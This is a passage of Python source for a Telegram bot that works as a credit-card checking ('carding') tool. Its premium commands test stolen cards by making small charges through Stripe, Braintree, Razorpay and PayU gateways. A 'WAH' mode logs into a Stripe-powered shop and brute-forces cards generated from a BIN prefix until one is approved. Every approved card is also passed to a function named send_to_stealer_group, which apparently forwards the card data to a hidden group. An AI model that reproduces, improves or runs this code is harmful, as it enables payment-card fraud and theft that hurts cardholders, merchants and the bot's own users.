        f"Gateway: Stripe $1 Donation",
        parse_mode=ParseMode.HTML
    )
    
    from modules.str_gate import check_str
    from modules.gate_checker import get_bin_info
    
    start_time = time_module.time()
    result = await check_str(cc, mm, yy, cvv)
    elapsed = time_module.time() - start_time
    
    bin_info = get_bin_info(cc)
    status = result.get('status', 'ERROR')
    response_msg = result.get('response', 'Unknown')
    
    bin_type = f"{bin_info.get('scheme', 'N/A').upper()}"
    if bin_info.get('type'):
        bin_type += f" - {bin_info.get('type', '').upper()}"
    username = user.username or user.first_name
    
    if status in ['LIVE', 'CHARGED']:
        log_approved_card(user.id, username, cc, mm, yy, cvv, "str", response_msg, bin_info)
        await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "str", response_msg, bin_info, user.id, username)
        response = _build_gate_response(cc, mm, yy, cvv, "approved", f"Approved - {response_msg}", "Stripe $1", bin_info, elapsed, username)
        try:
            await checking_msg.delete()
        except:
            pass
        gif_url = get_sexy_anime_gif("success")
        await update.message.reply_animation(animation=gif_url, caption=response, parse_mode=ParseMode.HTML)
    else:
        response = _build_gate_response(cc, mm, yy, cvv, "declined", f"Declined - {response_msg}", "Stripe $1", bin_info, elapsed, username)
        try:
            await checking_msg.delete()
        except:
            pass
        gif_url = get_sexy_anime_gif("failed")
        await update.message.reply_animation(animation=gif_url, caption=response, parse_mode=ParseMode.HTML)

@require_premium
async def gate_wah(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Website Auto-Hit: single card OR unlimited BIN loop against a Stripe-powered site."""
    from modules.gate_status import is_gate_offline, offline_message
    if is_gate_offline("wah"):
        await update.message.reply_text(offline_message("wah"), parse_mode=ParseMode.HTML)
        return
    import asyncio as _asyncio
    user = update.effective_user
    username = user.username or user.first_name
    user_id = user.id

    # ── Parse input ───────────────────────────────────────────────────────────
    # Formats:
    #   Single card:  /wah url|email|password|cc|mm|yy|cvv
    #   BIN loop:     /wah url|email|password|bin[|mm|yy|cvv]
    raw = update.message.text.split(maxsplit=1)
    if len(raw) < 2:
        await update.message.reply_text(
            ae("❌ <b>Invalid Format!</b>\n\n"
               "🎯 <b>Usage:</b>\n"
               "▸ Single card:\n"
               "  <code>/wah url|email|pass|cc|mm|yy|cvv</code>\n\n"
               "▸ BIN loop (hits until approved):\n"
               "  <code>/wah url|email|pass|bin</code>\n"
               "  <code>/wah url|email|pass|bin|mm|yy|cvv</code>\n\n"
               "💡 Use /stop to stop the BIN loop."),
            parse_mode=ParseMode.HTML,
        )
        return

    arg_str = raw[1].strip()
    # Support both pipe-separated and space-separated input
    if "|" in arg_str:
        parts = [p.strip() for p in arg_str.split("|")]
    else:
        parts = arg_str.split()
    if len(parts) < 4:
        await update.message.reply_text(
            "❌ <b>Need at least 4 fields:</b> url|email|password|cc_or_bin",
            parse_mode=ParseMode.HTML,
        )
        return

    site_url  = parts[0]
    email     = parts[1]
    password  = parts[2]
    card_part = parts[3]          # cc number OR BIN prefix
    mm_part   = parts[4] if len(parts) > 4 else "xx"
    yy_part   = parts[5] if len(parts) > 5 else "xx"
    cvv_part  = parts[6] if len(parts) > 6 else "xxx"

    # Detect BIN mode: numeric, 6–12 digits (not a full card number)
    card_digits = re.sub(r"\D", "", card_part)
    is_bin_mode = card_digits.isdigit() and 6 <= len(card_digits) <= 12

    from modules.gate_checker import get_bin_info
    from modules.stripe_web_auto import run_wah, setup_wah_session, charge_wah_card

    # ── Helper: format + send a result reply ─────────────────────────────────
    async def _send_result(cc, mm, yy, cvv, result, product_title, product_price):
        status   = result.get("status", "error")
        message  = result.get("message", "Unknown")
        stripe_pk = result.get("stripe_pk") or "N/A"
        elapsed   = result.get("elapsed", 0)
        price_str = f"${product_price:.2f}" if product_price else "N/A"
        bin_info  = get_bin_info(cc)
        bin_scheme = bin_info.get("scheme", "N/A").upper()
        bin_type   = bin_info.get("type", "").upper()
        bin_bank   = (bin_info.get("bank", {}).get("name", "N/A")
                      if isinstance(bin_info.get("bank"), dict)
                      else bin_info.get("bank", "N/A"))
        bin_country = (bin_info.get("country", {}).get("name", "N/A")
                       if isinstance(bin_info.get("country"), dict)
                       else bin_info.get("country", "N/A"))
        masked_pk = (stripe_pk[:14] + "…" + stripe_pk[-4:]) if len(stripe_pk) > 20 else stripe_pk

        if status == "approved":
            log_approved_card(user_id, username, cc, mm, yy, cvv, "wah", message, bin_info)
            await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "wah", message, bin_info, user_id, username)
            text = ae(
                f"✅ <b>APPROVED — WAH Gate</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"💳 <b>Card:</b> <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
                f"🌐 <b>Site:</b> <code>{site_url}</code>\n"
                f"🛒 <b>Product:</b> {product_title} ({price_str})\n"
                f"🔑 <b>PK:</b> <code>{masked_pk}</code>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"✅ <b>Result:</b> {message}\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🏦 <b>Bank:</b> {bin_bank}\n"
                f"🌍 <b>Country:</b> {bin_country}\n"
                f"💠 <b>Type:</b> {bin_scheme} {bin_type}\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"⏱ <b>Time:</b> {elapsed}s | 👤 {username}"
            )
            gif_url = get_sexy_anime_gif("success")
            await update.message.reply_animation(animation=gif_url, caption=text, parse_mode=ParseMode.HTML)
        elif status == "declined":
            text = ae(
                f"❌ <b>DECLINED — WAH Gate</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"💳 <b>Card:</b> <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
                f"🌐 <b>Site:</b> <code>{site_url}</code>\n"
                f"🛒 <b>Product:</b> {product_title} ({price_str})\n"
                f"🔑 <b>PK:</b> <code>{masked_pk}</code>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"❌ <b>Result:</b> {message}\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🏦 <b>Bank:</b> {bin_bank}\n"
                f"🌍 <b>Country:</b> {bin_country}\n"
                f"💠 <b>Type:</b> {bin_scheme} {bin_type}\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"⏱ <b>Time:</b> {elapsed}s | 👤 {username}"
            )
            gif_url = get_sexy_anime_gif("failed")
            await update.message.reply_animation(animation=gif_url, caption=text, parse_mode=ParseMode.HTML)
        else:
            text = ae(
                f"⚠️ <b>ERROR — WAH Gate</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"💳 <b>Card:</b> <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
                f"🌐 <b>Site:</b> <code>{site_url}</code>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"⚠️ <b>Result:</b> {message}\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"⏱ <b>Time:</b> {elapsed}s | 👤 {username}"
            )
            gif_url = get_sexy_anime_gif("failed")
            await update.message.reply_animation(animation=gif_url, caption=text, parse_mode=ParseMode.HTML)

    loop = _asyncio.get_event_loop()

    # ══════════════════════════════════════════════════════════════════════════
    # MODE A — Single card
    # ══════════════════════════════════════════════════════════════════════════
    if not is_bin_mode:
        cc, mm, yy, cvv = card_digits, mm_part, yy_part, cvv_part
        if not cc.isdigit() or len(cc) < 15:
            await update.message.reply_text("❌ <b>Invalid card number.</b>", parse_mode=ParseMode.HTML)
            return

        status_msg = await update.message.reply_text(
            ae(f"⌛️ <b>Website Auto-Hit in progress…</b>\n\n"
               f"🌐 <b>Site:</b> <code>{site_url}</code>\n"
               f"💳 <b>Card:</b> <code>{cc}|{mm}|{yy}|{cvv}</code>\n\n"
               f"Logging in and finding cheapest product…"),
            parse_mode=ParseMode.HTML,
        )
        try:
            result = await loop.run_in_executor(
                None, run_wah, site_url, email, password, cc, mm, yy, cvv
            )
        except Exception as e:
            try:
                await status_msg.delete()
            except Exception:
                pass
            masked_email = email[:3] + "***" + email[email.find("@"):] if "@" in email else email[:4] + "***"
            await update.message.reply_text(
                ae(f"⚠️ <b>ERROR — WAH Gate</b>\n"
                   f"━━━━━━━━━━━━━━━━━━\n"
                   f"💳 <b>Card:</b> <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
                   f"🌐 <b>Site:</b> <code>{site_url}</code>\n"
                   f"📧 <b>Email:</b> <code>{masked_email}</code>\n"
                   f"━━━━━━━━━━━━━━━━━━\n"
                   f"⚠️ <b>Result:</b> {str(e)[:200]}\n"
                   f"━━━━━━━━━━━━━━━━━━\n"
                   f"👤 {username}"),
                parse_mode=ParseMode.HTML,
            )
            return
        try:
            await status_msg.delete()
        except Exception:
            pass
        product_title = result.get("product_title") or "N/A"
        product_price = result.get("product_price")
        await _send_result(cc, mm, yy, cvv, result, product_title, product_price)
        return

    # ══════════════════════════════════════════════════════════════════════════
    # MODE B — BIN loop: generate cards indefinitely until approved or /stop
    # ══════════════════════════════════════════════════════════════════════════
    if context.user_data.get(f'mass_check_running_{user_id}'):
        await update.message.reply_text(
            ae("⏳ <b>Already Running</b>\n\nA WAH loop is already active. Use /stop to cancel."),
            parse_mode=ParseMode.HTML,
        )
        return

    bin_prefix = card_digits
    bin_display = f"{bin_prefix}{'x' * (16 - len(bin_prefix))}"

    status_msg = await update.message.reply_text(
        ae(f"⌛️ <b>WAH BIN Loop Starting…</b>\n\n"
           f"🌐 <b>Site:</b> <code>{site_url}</code>\n"
           f"💳 <b>BIN:</b> <code>{bin_display}</code>\n\n"
           f"Logging in and finding cheapest product…\n"
           f"Use /stop to cancel."),
        parse_mode=ParseMode.HTML,
    )

    # Phase 1: setup (login + find product) — blocking, run in executor
    try:
        setup = await loop.run_in_executor(
            None, setup_wah_session, site_url, email, password
        )
    except Exception as e:
        try:
            await status_msg.delete()
        except Exception:
            pass
        masked_email = email[:3] + "***" + email[email.find("@"):] if "@" in email else email[:4] + "***"
        await update.message.reply_text(
            ae(f"⚠️ <b>ERROR — WAH BIN Loop</b>\n"
               f"━━━━━━━━━━━━━━━━━━\n"
               f"🌐 <b>Site:</b> <code>{site_url}</code>\n"
               f"📧 <b>Email:</b> <code>{masked_email}</code>\n"
               f"💳 <b>BIN:</b> <code>{bin_display}</code>\n"
               f"━━━━━━━━━━━━━━━━━━\n"
               f"⚠️ <b>Result:</b> {str(e)[:250]}\n"
               f"━━━━━━━━━━━━━━━━━━\n"
               f"👤 {username}"),
            parse_mode=ParseMode.HTML,
        )
        return

    if not setup.get("ok"):
        try:
            await status_msg.delete()
        except Exception:
            pass
        masked_email = email[:3] + "***" + email[email.find("@"):] if "@" in email else email[:4] + "***"
        error_msg = setup.get("error", "Unknown error")
        await update.message.reply_text(
            ae(f"⚠️ <b>FAILED — WAH BIN Loop</b>\n"
               f"━━━━━━━━━━━━━━━━━━\n"
               f"🌐 <b>Site:</b> <code>{site_url}</code>\n"
               f"📧 <b>Email:</b> <code>{masked_email}</code>\n"
               f"💳 <b>BIN:</b> <code>{bin_display}</code>\n"
               f"━━━━━━━━━━━━━━━━━━\n"
               f"⚠️ <b>Result:</b> {error_msg}\n"
               f"━━━━━━━━━━━━━━━━━━\n"
               f"👤 {username}"),
            parse_mode=ParseMode.HTML,
        )
        return

    wah_session  = setup["session"]
    wah_product  = setup["product"]
    wah_site_url = setup["site_url"]
    product_title = wah_product.get("title", "N/A")
    product_price = wah_product.get("price")
    price_str = f"${product_price:.2f}" if product_price else "N/A"

    # Phase 2: BIN loop
    context.user_data[f'mass_check_running_{user_id}'] = True
    context.user_data['mass_check_stop'] = False

    checked    = 0
    approved   = 0
    declined   = 0
    errors     = 0
    last_card  = ""
    last_status_emoji = ""
    last_error = ""

    try:
        await status_msg.edit_text(
            ae(f"⌛️ <b>WAH BIN Loop Running</b>\n\n"
               f"🌐 <b>Site:</b> <code>{site_url}</code>\n"
               f"🛒 <b>Product:</b> {product_title} ({price_str})\n"
               f"💳 <b>BIN:</b> <code>{bin_display}</code>\n\n"
               f"⏳ Checked: 0 | ✅ Approved: 0 | ❌ Declined: 0\n\n"
               f"Use /stop to cancel."),
            parse_mode=ParseMode.HTML,
        )
    except Exception:
        pass

    BATCH = 10

    try:
        while True:
            if context.user_data.get('mass_check_stop'):
                break

            # Generate a fresh batch of cards from BIN
            gen_result = parse_gen_input(f"{bin_prefix}|{mm_part}|{yy_part}|{cvv_part}")
            if not gen_result:
                break
            prefix_g, mm_g, yy_g, cvv_g = gen_result
            card_lines = generate_cards_from_bin(prefix_g, mm_g, yy_g, cvv_g, BATCH)
            parsed_cards = auto_hitter_parse_cards("\n".join(card_lines))

            for card_obj in parsed_cards:
                if context.user_data.get('mass_check_stop'):
                    break

                cc  = card_obj.get("cc", "")
                mm  = card_obj.get("month", "")
                yy  = card_obj.get("year", "")
                cvv = card_obj.get("cvv", "")
                last_card = f"{cc}|{mm}|{yy}|{cvv}"

                # Charge in executor (single try — no double-counting)
                try:
                    result = await loop.run_in_executor(
                        None, charge_wah_card,
                        wah_session, wah_site_url, wah_product,
                        cc, mm, yy, cvv
                    )
                except Exception as e:
                    result = {"status": "error", "message": str(e)[:120], "stripe_pk": None, "elapsed": 0}

                checked += 1
                st = result.get("status", "error")
                result_msg = result.get("message", "")
                if st == "approved":
                    approved += 1
                    last_status_emoji = "✅"
                elif st == "declined":
                    declined += 1
                    last_status_emoji = "❌"
                    last_error = result_msg
                else:
                    errors += 1
                    last_status_emoji = "⚠️"
                    last_error = result_msg

                # Build progress text with last result reason
                error_line = (f"\n💬 <b>Last reason:</b> <i>{last_error[:120]}</i>" if last_error else "")
                # Update progress every card
                try:
                    await status_msg.edit_text(
                        ae(f"⌛️ <b>WAH BIN Loop Running</b>\n\n"
                           f"🌐 <b>Site:</b> <code>{site_url}</code>\n"
                           f"🛒 <b>Product:</b> {product_title} ({price_str})\n"
                           f"💳 <b>BIN:</b> <code>{bin_display}</code>\n"
                           f"🔍 <b>Last:</b> {last_status_emoji} <code>{last_card}</code>"
                           f"{error_line}\n\n"
                           f"⏳ Checked: {checked} | ✅ {approved} | ❌ {declined} | ⚠️ {errors}\n\n"
                           f"Use /stop to cancel."),
                        parse_mode=ParseMode.HTML,
                    )
                except Exception:
                    pass

                if st == "approved":
                    # Report the approved card and stop
                    try:
                        await status_msg.delete()
                    except Exception:
                        pass
                    await _send_result(cc, mm, yy, cvv, result, product_title, product_price)
                    return

                await _asyncio.sleep(1)

    finally:
        context.user_data[f'mass_check_running_{user_id}'] = False
        context.user_data['mass_check_stop'] = False

    # Stopped without approval
    try:
        await status_msg.delete()
    except Exception:
        pass
    error_summary = (f"\n💬 <b>Last reason:</b> <i>{last_error[:150]}</i>" if last_error else "")
    await update.message.reply_text(
        ae(f"🛑 <b>WAH BIN Loop Stopped</b>\n"
           f"━━━━━━━━━━━━━━━━━━\n"
           f"🌐 <b>Site:</b> <code>{site_url}</code>\n"
           f"💳 <b>BIN:</b> <code>{bin_display}</code>\n"
           f"🛒 <b>Product:</b> {product_title} ({price_str})\n"
           f"━━━━━━━━━━━━━━━━━━\n"
           f"⏳ Checked: {checked} | ✅ {approved} | ❌ {declined} | ⚠️ {errors}\n"
           f"🔍 <b>Last:</b> {last_status_emoji} <code>{last_card}</code>"
           f"{error_summary}\n"
           f"━━━━━━━━━━━━━━━━━━\n"
           f"👤 {username}"),
        parse_mode=ParseMode.HTML,
    )

@require_premium
async def mass_str(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass Stripe $1 Donation checker with 1 second delay"""
    import asyncio
    import time as time_module
    user = update.effective_user
    user_id = user.id
    
    if context.user_data.get(f'mass_check_running_{user_id}'):
        await update.message.reply_text(ae("⏳ <b>Already Running</b>\n\nYou have a mass check in progress. Use /stop to cancel."), parse_mode=ParseMode.HTML)
        return

    raw_text = ' '.join(context.args) if context.args else await get_txt_content_from_reply(update, context)
    if not raw_text:
        await update.message.reply_text(
            "📋 <b>MASS CHECK - Stripe $1 Donation</b>\n\n"
            "<b>Usage:</b>\n<code>/mstr CC|MM|YY|CVV CC|MM|YY|CVV ...</code>\n\n"
            "Or reply to a .txt file with cards.\n"
            "Max 50 cards per batch.",
            parse_mode=ParseMode.HTML
        )
        return

    cards_text = raw_text
    cards = [c.strip() for c in cards_text.replace('\n', ' ').split() if '|' in c]
    
    if not cards:
        await _get_or_edit_loading_msg(context, update, ae("❌ No valid cards found!"))
        return
    
    if len(cards) > 50:
        cards = cards[:50]
        await update.message.reply_text(ae("⚠️ Limited to 50 cards max."), parse_mode=ParseMode.HTML)
    
    context.user_data[f'mass_check_running_{user_id}'] = True
    
    status_msg = await _get_or_edit_loading_msg(
        context, update,
        f"🎀 <b>Mass Stripe Donation Check Started</b>\n\n"
        f"📋 Cards: {len(cards)}\n"
        f"⏱️ Delay: 1s between cards\n"
        f"🔄 Processing...",
    )
    
    from modules.str_gate import check_str
    from modules.gate_checker import get_bin_info
    
    approved = []
    declined = []
    errors = []
    username = user.username or user.first_name
    
    for i, card in enumerate(cards):
        if not context.user_data.get(f'mass_check_running_{user_id}'):
            break
        
        parts = card.strip().split('|')
        if len(parts) < 4:
            errors.append(card)
            continue
        
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        
        start_time = time_module.time()
        result = await check_str(cc, mm, yy, cvv)
        elapsed = time_module.time() - start_time
        
        status = result.get('status', 'ERROR')
        response_msg = result.get('response', 'Unknown')
        
        if status in ['LIVE', 'CHARGED']:
            approved.append(card)
            bin_info = get_bin_info(cc)
            log_approved_card(user.id, username, cc, mm, yy, cvv, "mstr", response_msg, bin_info)
            await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "mstr", response_msg, bin_info, user.id, username)
            await send_approved_card_with_gif(update, card, "mstr", response_msg, elapsed, bin_info)
        elif status == 'DEAD':
            declined.append(card)
        else:
            errors.append(card)
        
        if (i + 1) % 5 == 0:
            try:
                await status_msg.edit_text(
                    f"🎀 <b>Mass Stripe Donation Progress</b>\n\n"
                    f"✅ Approved: {len(approved)}\n"
                    f"❌ Declined: {len(declined)}\n"
                    f"⚠️ Errors: {len(errors)}\n"
                    f"📊 Progress: {i+1}/{len(cards)}",
                    parse_mode=ParseMode.HTML
                )
            except:
                pass
        
        if i < len(cards) - 1:
            await asyncio.sleep(1)
    
    context.user_data[f'mass_check_running_{user_id}'] = False
    
    summary = (
        f"🎀 <b>Mass Stripe Donation Complete</b>\n\n"
        f"✅ Approved: {len(approved)}\n"
        f"❌ Declined: {len(declined)}\n"
        f"⚠️ Errors: {len(errors)}\n"
        f"📊 Total: {len(cards)}"
    )
    
    if approved:
        summary += "\n\n<b>💳 Approved Cards:</b>\n"
        for card in approved[:10]:
            summary += f"<code>{card}</code>\n"
        if len(approved) > 10:
            summary += f"... and {len(approved) - 10} more"
    
    try:
        await status_msg.edit_text(summary, parse_mode=ParseMode.HTML)
    except:
        await update.message.reply_text(summary, parse_mode=ParseMode.HTML)

@require_premium
async def gate_b3n(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Braintree $5.00 checker"""
    from modules.gate_status import is_gate_offline, offline_message
    if is_gate_offline("b3n"):
        await update.message.reply_text(offline_message("b3n"), parse_mode=ParseMode.HTML)
        return
    import time as time_module
    user = update.effective_user
    card_data = parse_card(update.message.text)
    if not card_data:
        await update.message.reply_text(ae("❌ <b>Invalid Format!</b>\n\n🎯 <b>Usage:</b>\n<code>/b3n CC|MM|YY|CVV</code>"), parse_mode=ParseMode.HTML)
        return
    cc, mm, yy, cvv = card_data
    checking_msg = await update.message.reply_text(ae(f"🎀 <b>Checking card...</b>\n\n<code>{cc}|{mm}|{yy}|{cvv}</code>\nGateway: Braintree $5.00"), parse_mode=ParseMode.HTML)
    from modules.b3n_gate import check_b3n
    from modules.gate_checker import get_bin_info
    
    start_time = time_module.time()
    result = await check_b3n(cc, mm, yy, cvv)
    elapsed = time_module.time() - start_time
    
    if not result:
        result = {'status': 'ERROR', 'response': 'No Response from Gate'}
    bin_info = get_bin_info(cc)
    status, response_msg = result.get('status', 'ERROR'), result.get('response', 'Unknown')
    
    bin_type = f"{bin_info.get('scheme', 'N/A').upper()}"
    if bin_info.get('type'):
        bin_type += f" - {bin_info.get('type', '').upper()}"
    username = user.username or user.first_name
    
    if status in ['LIVE', 'CHARGED']:
        log_approved_card(user.id, username, cc, mm, yy, cvv, "b3n", response_msg, bin_info)
        await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "b3n", response_msg, bin_info, user.id, username)
        response = _build_gate_response(cc, mm, yy, cvv, "approved", f"Approved - {response_msg}", "Braintree $5", bin_info, elapsed, username)
        try:
            await checking_msg.delete()
        except:
            pass
        gif_url = get_sexy_anime_gif("success")
        await update.message.reply_animation(animation=gif_url, caption=response, parse_mode=ParseMode.HTML)
    else:
        response = _build_gate_response(cc, mm, yy, cvv, "declined", f"Declined - {response_msg}", "Braintree $5", bin_info, elapsed, username
        )
        try:
            await checking_msg.delete()
        except:
            pass
        gif_url = get_sexy_anime_gif("failed")
        await update.message.reply_animation(animation=gif_url, caption=response, parse_mode=ParseMode.HTML)

@require_premium
async def gate_rz(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Razorpay ₹1 checker using BarryX API"""
    from modules.gate_status import is_gate_offline, offline_message
    if is_gate_offline("rz"):
        await update.message.reply_text(offline_message("rz"), parse_mode=ParseMode.HTML)
        return
    import time as time_module
    user = update.effective_user
    card_data = parse_card(update.message.text)
    if not card_data:
        await update.message.reply_text(ae("❌ <b>Invalid Format!</b>\n\n🎯 <b>Usage:</b>\n<code>/rz CC|MM|YY|CVV</code>"), parse_mode=ParseMode.HTML)
        return
    cc, mm, yy, cvv = card_data
    card_str = f"{cc}|{mm}|{yy}|{cvv}"
    checking_msg = await update.message.reply_text(ae(f"🎀 <b>Checking card...</b>\n\n<code>{card_str}</code>\nGateway: Razorpay ₹1"), parse_mode=ParseMode.HTML)
    from modules.rz_gate import check_rz_async
    from modules.gate_checker import get_bin_info
    
    start_time = time_module.time()
    result = await check_rz_async(card_str)
    elapsed = time_module.time() - start_time
    
    if not result:
        result = {'status': 'ERROR', 'message': 'No Response from Gate'}
    bin_info = get_bin_info(cc)
    status, response_msg = result.get('status', 'ERROR'), result.get('message', 'Unknown')
    
    bin_type = f"{bin_info.get('scheme', 'N/A').upper()}"
    if bin_info.get('type'):
        bin_type += f" - {bin_info.get('type', '').upper()}"
    username = user.username or user.first_name
    
    if status == 'APPROVED':
        log_approved_card(user.id, username, cc, mm, yy, cvv, "rz", response_msg, bin_info)
        await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "rz", response_msg, bin_info, user.id, username)
        response = _build_gate_response(cc, mm, yy, cvv, "approved", f"Approved - {response_msg}", "Razorpay ₹1", bin_info, elapsed, username)
        try:
            await checking_msg.delete()
        except:
            pass
        gif_url = get_sexy_anime_gif("success")
        await update.message.reply_animation(animation=gif_url, caption=response, parse_mode=ParseMode.HTML)
    else:
        response = _build_gate_response(cc, mm, yy, cvv, "declined", f"Declined - {response_msg}", "Razorpay ₹1", bin_info, elapsed, username)
        try:
            await checking_msg.delete()
        except:
            pass
        gif_url = get_sexy_anime_gif("failed")
        await update.message.reply_animation(animation=gif_url, caption=response, parse_mode=ParseMode.HTML)

@require_premium
async def gate_mrz(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass Razorpay checker with 1 second delay"""
    from modules.gate_status import is_gate_offline, offline_message
    if is_gate_offline("mrz"):
        await update.message.reply_text(offline_message("mrz"), parse_mode=ParseMode.HTML)
        return
    import asyncio
    user = update.effective_user
    user_id = user.id

    if context.user_data.get(f'mass_check_running_{user_id}'):
        await update.message.reply_text(ae("⏳ <b>Already Running</b>\n\nYou have a mass check in progress."), parse_mode=ParseMode.HTML)
        return

    raw_text = ' '.join(context.args) if context.args else await get_txt_content_from_reply(update, context)
    if not raw_text:
        await update.message.reply_text("📋 <b>MASS CHECK - Razorpay ₹1</b>\n\n<b>Usage:</b>\n<code>/mrz CC|MM|YY|CVV CC|MM|YY|CVV ...</code>\n\nOr reply to a .txt file with cards.", parse_mode=ParseMode.HTML)
        return

    cards_text = raw_text
    cards = [c.strip() for c in cards_text.replace('\n', ' ').split() if '|' in c]
    
    if not cards:
        await _get_or_edit_loading_msg(context, update, ae("❌ No valid cards found!"))
        return
    
    if len(cards) > 50:
        cards = cards[:50]
        await update.message.reply_text(ae("⚠️ Limited to 50 cards max."), parse_mode=ParseMode.HTML)
    
    context.user_data[f'mass_check_running_{user_id}'] = True
    
    status_msg = await _get_or_edit_loading_msg(context, update, ae(f"🎀 <b>Mass Check Started</b>\n\n📋 Cards: {len(cards)}\n⏱️ Delay: 1s between cards\n🔄 Processing..."))
    
    from modules.rz_gate import check_rz_async
    from modules.gate_checker import get_bin_info
    
    approved = []
    declined = []
    errors = []
    
    for i, card in enumerate(cards):
        if not context.user_data.get(f'mass_check_running_{user_id}'):
            break
        
        result = await check_rz_async(card.strip())
        status = result.get('status', 'ERROR')
        
        if status == 'APPROVED':
            approved.append(card)
            parts = card.split('|')
            if len(parts) >= 4:
                cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
                bin_info = get_bin_info(cc)
                log_approved_card(user.id, user.username or user.first_name, cc, mm, yy, cvv, "mrz", result.get('message', ''), bin_info)
                await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "mrz", result.get('message', ''), bin_info, user.id, user.username or user.first_name)
                check_time = result.get('time', 3.0)
                await send_approved_card_with_gif(update, card, "mrz", result.get('message', 'CVV Match'), check_time, bin_info)
        elif status == 'DECLINED':
            declined.append(card)
        else:
            errors.append(card)
        
        if (i + 1) % 5 == 0:
            try:
                await status_msg.edit_text(ae(f"🎀 <b>Mass Check Progress</b>\n\n✅ Approved: {len(approved)}\n❌ Declined: {len(declined)}\n⚠️ Errors: {len(errors)}\n📊 Progress: {i+1}/{len(cards)}"), parse_mode=ParseMode.HTML)
            except:
                pass
        
        if i < len(cards) - 1:
            await asyncio.sleep(1)
    
    context.user_data[f'mass_check_running_{user_id}'] = False
    
    summary = f"🎀 <b>Mass Check Complete</b>\n\n✅ Approved: {len(approved)}\n❌ Declined: {len(declined)}\n⚠️ Errors: {len(errors)}\n📊 Total: {len(cards)}"
    
    if approved:
        summary += "\n\n<b>💳 Approved Cards:</b>\n"
        for card in approved[:10]:
            summary += f"<code>{card}</code>\n"
        if len(approved) > 10:
            summary += f"... and {len(approved) - 10} more"
    
    try:
        await status_msg.edit_text(summary, parse_mode=ParseMode.HTML)
    except:
        await update.message.reply_text(summary, parse_mode=ParseMode.HTML)

@require_premium
async def gate_payu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """PayU ₹1 Gate - Single card check"""
    from modules.gate_status import is_gate_offline, offline_message
    if is_gate_offline("payu"):
        await update.message.reply_text(offline_message("payu"), parse_mode=ParseMode.HTML)
        return
    import asyncio
    user = update.effective_user

    if not context.args:
        await update.message.reply_text(ae("🎀 <b>PayU ₹1 Gate</b>\n\n<b>Usage:</b>\n<code>/payu CC|MM|YY|CVV</code>\n\n💡 Uses MiracleManna donation gateway"), parse_mode=ParseMode.HTML)
        return
    
    card_str = context.args[0].strip()
    if '|' not in card_str:
        await update.message.reply_text(ae("❌ Invalid format! Use: <code>/payu CC|MM|YY|CVV</code>"), parse_mode=ParseMode.HTML)
        return
    
    checking_msg = await update.message.reply_text(ae("🔄 <b>Checking card via PayU...</b>"), parse_mode=ParseMode.HTML)
    
    from modules.payu_gate import check_payu_async, format_payu_response
    from modules.gate_checker import get_bin_info
    
    result = await check_payu_async(card_str)
    parts = card_str.split('|')
    bin_info = get_bin_info(parts[0]) if parts else {}
    
    response = format_payu_response(result, bin_info, user.username or user.first_name)
    
    try:
        await checking_msg.delete()
    except:
        pass
    
    if result.get('status') == 'APPROVED':
        gif_url = get_sexy_anime_gif("success")
        if len(parts) >= 4:
            cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
            log_approved_card(user.id, user.username or user.first_name, cc, mm, yy, cvv, "payu", result.get('message', ''), bin_info)
            await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "payu", result.get('message', ''), bin_info, user.id, user.username or user.first_name)
            check_time = result.get('time', 3.0)
            await send_approved_card_with_gif(update, card_str, "payu", result.get('message', 'Charged'), check_time, bin_info)
    else:
        gif_url = get_sexy_anime_gif("failed")
    
    await update.message.reply_animation(animation=gif_url, caption=response, parse_mode=ParseMode.HTML)

@require_premium
async def gate_mpayu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass PayU checker with 1 second delay"""
    from modules.gate_status import is_gate_offline, offline_message
    if is_gate_offline("mpayu"):
        await update.message.reply_text(offline_message("mpayu"), parse_mode=ParseMode.HTML)
        return
    import asyncio
    user = update.effective_user
    user_id = user.id

    if context.user_data.get(f'mass_check_running_{user_id}'):
        await update.message.reply_text(ae("⏳ <b>Already Running</b>\n\nYou have a mass check in progress."), parse_mode=ParseMode.HTML)
        return

    raw_text = ' '.join(context.args) if context.args else await get_txt_content_from_reply(update, context)
    if not raw_text:
        await update.message.reply_text("📋 <b>MASS CHECK - PayU ₹1</b>\n\n<b>Usage:</b>\n<code>/mpayu CC|MM|YY|CVV CC|MM|YY|CVV ...</code>\n\nOr reply to a .txt file with cards.", parse_mode=ParseMode.HTML)
        return

    cards_text = raw_text
    cards = [c.strip() for c in cards_text.replace('\n', ' ').split() if '|' in c]
    
    if not cards:
        await _get_or_edit_loading_msg(context, update, ae("❌ No valid cards found!"))
        return
    
    if len(cards) > 50:
        cards = cards[:50]
        await update.message.reply_text(ae("⚠️ Limited to 50 cards max."), parse_mode=ParseMode.HTML)
    
    context.user_data[f'mass_check_running_{user_id}'] = True
    
